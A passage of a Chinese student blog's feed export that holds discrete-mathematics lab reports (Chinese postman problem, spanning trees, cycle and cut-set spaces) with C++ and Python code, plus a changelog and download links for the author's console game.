class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		cin &gt;&gt; m;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;请输入关联矩阵：&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">				cin &gt;&gt; grid[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">dfs</span>(<span class="number">0</span>, n, m, grid, edgest, pointst, ans, setsize);</span><br><span class="line">		</span><br><span class="line">		<span class="type">int</span> len = ans.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">int</span> max = <span class="number">0</span>;<span class="comment">//记录最大匹配的位置;</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (setsize[i] &gt; max)</span><br><span class="line">				max = i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> reslong = ans[max].<span class="built_in">size</span>();<span class="comment">//记录找到的数组的长度</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//将所有的最大匹配集输出</span></span><br><span class="line">		<span class="type">int</span> cc = <span class="number">1</span>;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; len; k++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (setsize[k] == reslong)<span class="comment">//若是最大匹配集的长度就输出</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(cc)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;最大匹配：M = &#123; &quot;</span>);</span><br><span class="line">					cc = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;          M = &#123; &quot;</span>);</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; reslong; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;e%d,&quot;</span>, ans[k][i]<span class="number">+1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\b &#125;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	    <span class="comment">// 建立节点</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> v_num = m, e_num = n;</span><br><span class="line">		</span><br><span class="line">	    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v_num; i++)</span><br><span class="line">		&#123;</span><br><span class="line">	        points.<span class="built_in">push_back</span>(Node&#123;i&#125;);</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; e_num; j++)</span><br><span class="line">		&#123;</span><br><span class="line">	        vector&lt;<span class="type">int</span>&gt; t;</span><br><span class="line">	        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v_num; i++) &#123;</span><br><span class="line">	            <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) t.<span class="built_in">push_back</span>(i);</span><br><span class="line">	        &#125;</span><br><span class="line">	        points[t[<span class="number">0</span>]].child.<span class="built_in">push_back</span>(points[t[<span class="number">1</span>]]);</span><br><span class="line">	        points[t[<span class="number">1</span>]].child.<span class="built_in">push_back</span>(points[t[<span class="number">0</span>]]);</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    vector&lt;<span class="type">bool</span>&gt; visited;</span><br><span class="line">	    visited.<span class="built_in">assign</span>(v_num, <span class="literal">false</span>);</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v_num; i++) &#123;</span><br><span class="line">	        <span class="built_in">search</span>(visited, i, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="built_in">sort</span>(results.<span class="built_in">begin</span>(), results.<span class="built_in">end</span>(), <span class="built_in">CompareVectors</span>());</span><br><span class="line">	    </span><br><span class="line">	    cout &lt;&lt; <span class="string">&quot;匹配数：β1 = &quot;</span> &lt;&lt; results[<span class="number">0</span>].<span class="built_in">size</span>() / <span class="number">2</span> &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">postman</span>(n, m, grid);</span><br><span class="line">		</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中国邮递员问题</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">1 0 0 1 1</span></span><br><span class="line"><span class="comment">1 1 0 0 0</span></span><br><span class="line"><span class="comment">0 0 1 1 0</span></span><br><span class="line"><span class="comment">0 1 1 0 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">1 0 0 1 0 1</span></span><br><span class="line"><span class="comment">1 1 0 0 0 0</span></span><br><span class="line"><span class="comment">0 1 1 0 0 0</span></span><br><span class="line"><span class="comment">0 0 0 1 1 0</span></span><br><span class="line"><span class="comment">0 0 1 0 1 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">1 1 0 0 0 0 1</span></span><br><span class="line"><span class="comment">1 0 0 1 0 1 0</span></span><br><span class="line"><span class="comment">0 0 0 0 1 1 1</span></span><br><span class="line"><span class="comment">0 1 1 0 1 0 0</span></span><br><span class="line"><span class="comment">0 0 1 1 0 0 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">1 1 0 0 0 0</span></span><br><span class="line"><span class="comment">0 1 0 1 0 1</span></span><br><span class="line"><span class="comment">0 0 1 1 0 0</span></span><br><span class="line"><span class="comment">1 0 1 0 1 0</span></span><br><span class="line"><span class="comment">0 0 0 0 1 1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="4、调试分析"><a href="#4、调试分析" class="headerlink" title="4、调试分析"></a>4、调试分析</h3><ul>
<li><p>（1）调试过程中所遇到的问题及解决方法：</p>
<ul>
<li><p>问题很多</p>
<p>解决方法：基本解决了</p>
</li>
</ul>
</li>
<li><p>（2）算法的时空分析：</p>
<ul>
<li><ol>
<li><p>dfs函数</p>
<p>时间复杂性：</p>
<ul>
<li>在最坏情况下，对于每个节点，都要考虑是否选择当前边，因此时间复杂度为 O(2^m)，其中 m 为边的数量。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n + m)，主要由递归调用和存储结果列表所占空间。</li>
</ul>
</li>
<li><p>path_dfs函数</p>
<p>时间复杂性：</p>
<ul>
<li>在最坏情况下，需要遍历所有可能的路径，时间复杂度为 O(n!)，其中 n 为节点的数量。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n)，主要由递归调用和存储结果列表所占空间。</li>
</ul>
</li>
<li><p>construct_path函数</p>
<p>时间复杂性：</p>
<ul>
<li>该函数在最坏情况下需要遍历整个路径，时间复杂度为 O(n)，其中 n 为路径的长度。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n)，主要由存储路径的列表所占空间。</li>
</ul>
</li>
<li><p>dijkstra函数</p>
<p>时间复杂性：</p>
<ul>
<li>由于使用了堆优化的Dijkstra算法，时间复杂度为 O((n + m) * log(n))，其中 n 为节点数量，m 为边数量。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n)，主要由存储最短路径长度、前驱节点和优先队列所占空间。</li>
</ul>
</li>
<li><p>postman函数</p>
<p>时间复杂性：</p>
<ul>
<li>该函数的主要复杂度来自DFS、Dijkstra以及对最大匹配的搜索。DFS的时间复杂度为 O(2^odd)，其中 odd 为奇数度节点的数量。Dijkstra的时间复杂度为 O((n + m) <em>log(n))。因此，总体时间复杂度为 O((n + m)</em> log(n) + 2^odd)。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n + m + odd^2)，主要由存储图结构、路径信息和Dijkstra算法的空间占用。</li>
</ul>
</li>
<li><p>search函数</p>
<p>时间复杂性：</p>
<ul>
<li>在最坏情况下，需要遍历所有可能的路径，时间复杂度为 O(n!)，其中 n 为节点的数量。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n)，主要由递归调用和存储结果列表所占空间。</li>
</ul>
</li>
<li><p>主函数部分：</p>
<p>时间复杂性：</p>
<ul>
<li>主程序主要调用了上述函数，因此总体时间复杂度取决于这些函数的复杂度。</li>
</ul>
<p>空间复杂性：</p>
<ul>
<li>O(n + m)，主要由存储图结构和结果列表所占空间。</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li><p>实际性能可能会受到不同输入情况的影响。</p>
</li>
<li><p>需要注意的是，这些复杂度分析是基于最坏情况下的情形，实际运行中可能会受到具体输入数据的影响。</p>
</li>
</ul>
<h2 id="（五）实验结果"><a href="#（五）实验结果" class="headerlink" title="（五）实验结果"></a>（五）实验结果</h2><p><img src="/img/discrete/3/4.png" alt="img"></p>
<p><img src="/img/discrete/3/5.png" alt="img"></p>
<h2 id="（六）实验总结"><a href="#（六）实验总结" class="headerlink" title="（六）实验总结"></a>（六）实验总结</h2><ul>
<li><p>在完成这个实验的过程中，我深刻体会到了解决复杂图论问题的挑战和乐趣。以下是一些实验总结的要点：</p>
<ol>
<li><p>复杂问题的分解：</p>
<p>图论问题通常涉及多个步骤和算法的组合。通过合理的分解问题，将其划分为更小的子问题，有助于更好地理解和解决整体问题。在这个实验中，中国邮递员问题被分解为寻找所有可能路径、计算最短路径、最大匹配等多个子问题。</p>
</li>
<li><p>深度优先搜索与动态规划：</p>
<p>深度优先搜索在图论问题中具有广泛的应用。通过深度优先搜索，可以找到图中的所有路径，从而解决一些组合型问题。动态规划则可以用于记录中间结果，避免重复计算，提高算法效率。</p>
</li>
<li><p>算法的选择与优化：</p>
<p>在处理图论问题时，选择合适的算法非常关键。例如，在中国邮递员问题中，选择了深度优先搜索和Dijkstra算法来解决子问题。此外，通过使用堆优化的Dijkstra算法，提高了寻找最短路径的效率。</p>
</li>
<li><p>调试与测试：</p>
<p>在编写复杂的程序时，调试和测试是不可或缺的环节。通过逐步调试，检查算法的正确性，发现并修复潜在的错误。编写一些简单但具有代表性的测试用例，验证算法在不同情况下的鲁棒性。</p>
</li>
<li><p>空间与时间复杂度的权衡：</p>
<p>在解决问题时，需要综合考虑算法的时间复杂度和空间复杂度。有时候，为了提高运行效率，可能需要占用更多的空间，这是一个常见的权衡问题。</p>
</li>
<li><p>编码规范与可读性：</p>
<p>写出清晰、规范、可读性高的代码是良好编程实践的一部分。良好的代码风格和注释有助于他人理解代码，也有助于自己在后续维护和修改时更容易理解代码逻辑。</p>
</li>
</ol>
</li>
<li><p>总的来说，通过这个实验，我对图论问题的解决方法有了更深入的了解，也提高了对复杂问题分析和解决的能力。同时，实验中的调试和测试过程让我更加注重代码的质量和稳定性。这对于日后处理更加复杂的问题将是非常宝贵的经验。</p>
</li>
</ul>
<p>参考文献：<a href="https://fourfire.cc/posts/discrete_3.html">离散数学II实验四 ： 白</a></p>
]]></content>
      <categories>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>实验报告</tag>
        <tag>离散数学</tag>
        <tag>离散</tag>
        <tag>Python</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>童年的纸飞机</title>
    <url>/posts/childhood.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>动态感悟</category>
      </categories>
      <tags>
        <tag>系列</tag>
        <tag>童年</tag>
        <tag>少儿频道</tag>
        <tag>CCTV14</tag>
        <tag>动漫世界</tag>
      </tags>
  </entry>
  <entry>
    <title>重生之西游记（下载地址及更新日志）</title>
    <url>/posts/Journey-to-the-West.html</url>
    <content><![CDATA[<h2 id="最新版本Latest"><a href="#最新版本Latest" class="headerlink" title="最新版本Latest"></a>最新版本Latest</h2><div style="background-color: black; height: 2px; width:100%; "></div>

<h3 id="2-5-（-2023-12-01-）"><a href="#2-5-（-2023-12-01-）" class="headerlink" title="# 2.5 （ 2023 / 12 / 01 ）"></a># 2.5 （ 2023 / 12 / 01 ）</h3><a href="/file/重生之西游记（2.5）.exe"  title="重生之西游记（2.5）.exe" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/zmxy.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">重生之西游记（2.5）.exe</div><div class="link_desc">点击下载</div></div></a>
<details class="folding-tag" green><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 优化了整个装备系统，更新了UI界面与交互提示，并全部改为数字输入<br>●<br>●<br>● </p>
              </div>
            </details>
<div style="height: 80px;"></div>

<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><div style="background-color: black; height: 2px; width:100%; "></div>

<h3 id="2-4-（-2023-11-01-）"><a href="#2-4-（-2023-11-01-）" class="headerlink" title="# 2.4 （ 2023 / 11 / 01 ）"></a># 2.4 （ 2023 / 11 / 01 ）</h3><a href="/file/重生之西游记（2.4）.exe"  title="重生之西游记（2.4）.exe" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/zmxy.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">重生之西游记（2.4）.exe</div><div class="link_desc">点击下载</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 修复了电脑中必须安装Visual Studio才能运行的bug（Debug生成改为了Release生成）<br>● 修复了旧版控制台无法正常显示颜色的bug（适配方式为选择式）<br>● 修复了旧版控制台无法正常清屏的bug（适配方式为选择式）</p><p>● 优化了部分界面的交互提示<br>● 优化了商店的UI显示，使得商店在展示任何数量商品的情况下都能正常显示<br>● 优化了各“存档”、“退出游戏”等功能对应的按键（“0”&lt;—&gt;“Enter”），避免用户在退出/确定一些界面时容易出现“连点‘同一按键’导致退出游戏”的情况</p><p>● 更新了“造梦西游”图标（姑且暂用）</p><p>● 新增了进入游戏前“新版控制台”与“旧版控制台”的选项，玩家可根据情况自行选择<br>● 新增了 ↑←↓→ 在含WASD的选项中（但是仍会出现如：“按下‘M’与按下‘→’效果相同”的情况，因为ASCII码相同……）</p>
              </div>
            </details>
<h3 id="2-3-（-2023-09-18-）-目前现存的最老版本"><a href="#2-3-（-2023-09-18-）-目前现存的最老版本" class="headerlink" title="# 2.3 （ 2023 / 09 / 18 ） (目前现存的最老版本)"></a># 2.3 （ 2023 / 09 / 18 ） (目前现存的最老版本)</h3><a href="/file/重生之西游记（2.3）.exe"  title="重生之西游记（2.3）.exe" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/exe.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">重生之西游记（2.3）.exe</div><div class="link_desc">点击下载</div></div></a>
<details class="folding-tag" blue><summary> 更新日志 </summary>
              <div class='content'>
              <p>● 新增了对战系统中的boss形象（目前只是火柴人）<br>● 增加了地图样式切换，现在有 WASD选择/数字选择 两种移动方式</p>
              </div>
            </details>
<h3 id="1-0-2-2无保留文件"><a href="#1-0-2-2无保留文件" class="headerlink" title="# 1.0~2.2无保留文件"></a># 1.0~2.2无保留文件</h3>]]></content>
      <categories>
        <category>游戏相关</category>
      </categories>
      <tags>
        <tag>游戏</tag>
        <tag>重生之西游记</tag>
      </tags>
  </entry>
  <entry>
    <title>离散数学II实验二（Python/C++）</title>
    <url>/posts/discrete_2.html</url>
    <content><![CDATA[<h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a><center>实验二</center></h1><h2 id="（一）实验题目"><a href="#（一）实验题目" class="headerlink" title="（一）实验题目"></a>（一）实验题目</h2><p>通信网络上的线路设计问题</p>
<h2 id="（二）实验目的"><a href="#（二）实验目的" class="headerlink" title="（二）实验目的"></a>（二）实验目的</h2><p>1、 掌握无向连通图生成树的求解方法；</p>
<p>2、 掌握基本回路系统和环路空间的求解方法；</p>
<p>3、 掌握基本割集系统和断集空间的求解方法；</p>
<p>4、 了解生成树、环路空间和断集空间的实际应用。</p>
<h2 id="（三）实验要求"><a href="#（三）实验要求" class="headerlink" title="（三）实验要求"></a>（三）实验要求</h2><p>在通信网络中，节点之间有网络线路传输数据包，假设两节点之间最多有一条网络线路，给定该通信网络节点之间的连接关系，求解如下问题：</p>
<div style="display: flex; align-items: center;">
    <span>1、  用图结构描述上述通信网络，如给定相邻矩阵：</span>
    <img style="height:72px; margin:0 5px 0px" src="/img/discrete/2/1.png">
    <span>。</span>
</div>

<p>2、 如何在通信网络中确保消息可以有效地从源节点传播到所有目标节点，以减少了冗余的数据转发？（提示：通过构建一棵生成树，数据可以沿着生成树的拓扑结构进行传输（如给出生成树的关联矩阵）。）</p>
<p>3、 有多少种上述实现方案？（提示：求方阵的行列式和秩见参考代码。）</p>
<p>4、 如何在该通信网络中，解决数据包转发和路由选择的问题？（提示：通过探测和避免环路空间，可以保证数据在网络中的正常传输，并降低数据包丢失和延迟。即输出基本回路系统（输出形式如：<code>&#123;e1e4e3,e2e5e3&#125;</code>）和环路空间（输出形式如：<code>&#123;Φ,e1e4e3,e2e5e3,e1e4e5e2&#125;</code>）。）</p>
<p>5、 在网络安全和隐私保护中，如何识别可能容易遭到攻击或数据泄露的路径或节点？（通过分析断集空间，可以采取相应的保护措施，提高网络安全性和数据隐私性。即输出基本割集系统（输出形式如：<code>&#123;&#123;e1,e4&#125;,&#123;e2,e5&#125;,&#123;e3,e4,e5&#125;&#125;</code>）和断集空间（输出形式如：<code>&#123;Φ,&#123;e1,e4&#125;,&#123;e2,e5&#125;,&#123;e3,e4,e5&#125;,&#123;e1,e2,e4,e5&#125;,&#123;e1,e3,e5&#125;,&#123;e2,e3,e4&#125;,&#123;e1,e2,e3&#125;&#125;</code>）。）</p>
<h2 id="（四）实验内容和实验步骤"><a href="#（四）实验内容和实验步骤" class="headerlink" title="（四）实验内容和实验步骤"></a>（四）实验内容和实验步骤</h2><h3 id="1、需求分析"><a href="#1、需求分析" class="headerlink" title="1、需求分析"></a>1、需求分析</h3><ul>
<li><p>（1） 输入的形式和输入值的范围：</p>
<ul>
<li><p>输入形式：例如</p>
<p><img src="/img/discrete/2/2.png" alt="img"></p>
<p>（可给定任意数量的序列）</p>
</li>
<li><p>输入值的范围：非负整数</p>
</li>
</ul>
</li>
<li><p>（2） 输出的形式：</p>
<p><img src="/img/discrete/2/3.png" alt="img"></p>
<ul>
<li><p>如图所示，输出时，按照实验要求的顺序依次展开输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──生成树的关联矩阵</span><br><span class="line">──方案数</span><br><span class="line">──基本回路系统和环路空间</span><br><span class="line">──基本割集系统和断集空间</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>（3） 程序所能实现的功能：</p>
<ul>
<li>能通过给定的相邻矩阵输出生成树的关联矩阵，计算生成树的个数，输出基本回路系统和环路空间，输出基本割集系统和断集空间</li>
<li>可循环，反复输入，方便测试多组数据</li>
</ul>
</li>
</ul>
<h3 id="2、-概要设计"><a href="#2、-概要设计" class="headerlink" title="2、 概要设计"></a>2、 概要设计</h3><ul>
<li><div style="display: flex; align-items: center;">
  <span>我选择的是</span>
    <img style="height:30px; margin:0 5px 0px" src="/img/discrete/2/python.png">
  <span>Python 进行编程，（后面写的C++同理，就不解析了）</span>
</div>
</li>
<li><p>下面是各函数的功能分析：</p>
<ul>
<li><ol>
<li><p>生成树的关联矩阵</p>
<p>先计算出关联矩阵，然后去除关联矩阵中的任意一行，取出一个结果，其中从m中选出的n-1列就是选出的树枝。采用二进制枚举进行排列组合，判断1~2n+1-1转换成二进制数有多少个1，符合则将它存起来。</p>
</li>
<li><p>计算生成树的个数，即实现方案数</p>
<p>设图G的度矩阵为D(G)，邻接矩阵为A(G)。定义拉普拉斯矩阵L(G) = D(G) - A(G)，则L(G)的任意一个余子式的值即为图G的生成树个数。通过分析，我们发现拉普拉斯矩阵的对角线上的元素是相邻矩阵对应行上所有元素的度数之和，而其他元素为相邻矩阵的相反数。得到拉普拉斯矩阵后，我们可以取其第一行第一列的余子式，即去除第一行和第一列的行列式。</p>
<p>对于求行列式的过程，我们可以采用定义法，按照第一行展开，得到n个代数余子式。这些余子式同样是求行列式，然后按照它们的第一行展开，一直递归到只剩一行时结束，即可计算出整个行列式的值。</p>
</li>
<li><p>求此生成树对应的基本回路系统</p>
<p>通过分析生成树的边，我们可以推导出与该生成树相关联的弦。接着，根据每条弦连接的两个顶点，在生成树中找到这两个顶点之间的一条路径。将这条路径与弦一起组合，形成一个回路。这样，我们就能得到基本回路系统。在寻找路径的过程中，采用了广度优先搜索（BFS）算法，以生成树中的某一顶点作为根节点，搜索时记录其子节点。最后，根据保存的子节点信息，为每个子节点找到其对应的父节点。通过以另一个顶点为起点，向上回溯直到根节点，我们就能得到一条完整的回路。</p>
</li>
<li><p>求此生成树对应的基本割集系统</p>
<p>对于每一条树枝，可以先将其删除，然后尝试将一条弦加入图中。如果加入弦之后，图仍然是连通的，那么该弦应该属于与这条树枝关联的割集；否则，该弦不属于该割集。连通性的判断可以通过对图的邻接矩阵进行广度优先搜索（BFS）来实现，如果所有节点都被访问过，则图是连通的。</p>
</li>
<li><p>环路空间和断集空间</p>
<p>环路空间的计算可以通过选择生成树的基本回路系统中的若干个回路（1~n）进行环合运算来实现。具体过程是先选取第一个回路生成数组A，然后对于后续的每个回路，检查其中的边是否在A中。如果在A中，则将这条边从A中删除，如果不在A中，则将这条边加入A。</p>
<p>为了实现取若干个回路的操作，可以使用二进制枚举法，从1到2n-1，其中1表示被选中，0表示不被选中。通过这种方式，可以枚举出所有选择的情况。在这里，可以使用 itertools 中的 combination 函数来实现。</p>
<p>割集空间的计算与环路空间类似，同样可以通过选择生成树的基本回路系统中的若干个割集进行割集合并运算来得到结果。</p>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="3、详细设计"><a href="#3、详细设计" class="headerlink" title="3、详细设计"></a>3、详细设计</h3><ul>
<li>源代码：（Python和C++）</li>
</ul>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python:"></a>Python:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关联矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Incidence_matrix</span>(<span class="params">l: <span class="built_in">list</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    ll = copy.deepcopy(l)</span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">            <span class="keyword">if</span> ll[i][j] &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(ll[i][j]):</span><br><span class="line">                    t = [<span class="number">0</span>] * <span class="built_in">len</span>(l)</span><br><span class="line">                    t[i], t[j] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">                    m.append(t)</span><br><span class="line">                    ll[i][j] -= <span class="number">1</span></span><br><span class="line">                    ll[j][i] -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成树</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">l: <span class="built_in">list</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    x = <span class="built_in">list</span>(itertools.combinations(<span class="built_in">range</span>(<span class="built_in">len</span>(l)), <span class="built_in">len</span>(l[<span class="number">0</span>]) - <span class="number">1</span>))</span><br><span class="line">    side = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> x:</span><br><span class="line">        matrix = [l[i][<span class="number">1</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> each]</span><br><span class="line">        <span class="keyword">if</span> np.linalg.det(matrix) != <span class="number">0</span>:</span><br><span class="line">            side = each</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    adj_tree = [[<span class="number">0</span>] * <span class="built_in">len</span>(l[<span class="number">0</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l[<span class="number">0</span>]))]</span><br><span class="line">    inc_tree = [l[i] <span class="keyword">for</span> i <span class="keyword">in</span> side]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inc_tree:</span><br><span class="line">        e = [j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)) <span class="keyword">if</span> i[j] == <span class="number">1</span>]</span><br><span class="line">        adj_tree[e[<span class="number">0</span>]][e[<span class="number">1</span>]], adj_tree[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> adj_tree, inc_tree, side</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算生成树的个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree_number</span>(<span class="params">l: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(l)):</span><br><span class="line">        t = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(l)):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                t.append(<span class="built_in">sum</span>(l[i]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                t.append(-l[i][j])</span><br><span class="line">        m.append(t)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">round</span>(np.linalg.det(np.array(m)), <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义节点类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value, pre=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.pre = pre</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">        <span class="variable language_">self</span>.succ = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 广度优先搜索</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BFS_loop</span>(<span class="params">adj_tree: <span class="built_in">list</span>, start: <span class="built_in">int</span>, end: <span class="built_in">int</span></span>):</span><br><span class="line">    nodes = [Node(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(adj_tree))]</span><br><span class="line">    visited = [<span class="literal">False</span>] * <span class="built_in">len</span>(adj_tree)</span><br><span class="line">    visited[start] = <span class="literal">True</span></span><br><span class="line">    queue = [start]</span><br><span class="line">    <span class="comment"># BFS搜索</span></span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        now = queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> now == end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(adj_tree)):</span><br><span class="line">            <span class="keyword">if</span> adj_tree[now][i] == <span class="number">1</span> <span class="keyword">and</span> visited[i] == <span class="literal">False</span>:</span><br><span class="line">                nodes[now].succ.append(nodes[i])</span><br><span class="line">                queue.append(i)</span><br><span class="line">                visited[i] = <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 为所有后继节点的pre赋值，方便找到父节点</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> node.succ:</span><br><span class="line">            i.pre = node</span><br><span class="line">    path = [end]</span><br><span class="line">    <span class="comment"># 从终点向回找，找到根节点结束</span></span><br><span class="line">    <span class="keyword">while</span> nodes[end].pre:</span><br><span class="line">        end = nodes[end].pre.value</span><br><span class="line">        path.insert(<span class="number">0</span>, end)</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本回路系统</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Basic_loop_system</span>(<span class="params">adj_tree: <span class="built_in">list</span>, inc: <span class="built_in">list</span>, side: <span class="built_in">list</span></span>):</span><br><span class="line">    chord = <span class="built_in">list</span>(<span class="built_in">set</span>(<span 